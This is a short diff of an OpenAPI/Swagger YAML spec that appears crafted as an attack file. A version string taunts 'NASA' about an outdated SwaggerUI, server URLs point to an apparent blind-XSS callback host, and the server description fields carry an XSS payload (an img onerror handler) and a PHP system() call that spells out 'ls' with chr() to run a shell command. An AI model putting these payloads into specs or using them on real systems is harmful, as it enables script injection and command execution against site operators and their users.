@@ -5,8 +5,8 @@ info:
   version: Hei, NASA. You should upgrade to higher version of SwaggerUI.
 
 servers:
-  - url: https://paktiko.bxss.in
+  - url: https://paktiko.bxss.in#
     description: <img src=x onerror="alert('XSS')">
-  - url: https://paktiko.bxss.in
+  - url: https://paktiko.bxss.in#
     description: <?php echo system(chr(0x6c).chr(0x73)); ?/>
     
